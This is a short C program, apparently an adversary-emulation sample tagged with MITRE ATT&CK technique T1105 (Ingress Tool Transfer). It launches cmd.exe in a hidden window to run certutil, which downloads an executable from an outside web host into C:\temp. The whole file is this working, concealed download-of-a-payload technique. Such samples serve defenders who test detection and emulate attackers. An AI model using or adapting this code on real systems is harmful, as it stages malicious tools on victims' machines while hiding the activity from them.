// Link      = https://attack.mitre.org/techniques/T1105/
// Technique = Ingress Tool Transfer
// ID        = T1105.000
// Tactics   = Command and Control

#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("certutil -urlcache -split -f http://www.xyz.com/x.exe C:\\temp\\x.exe");
    return 0;
}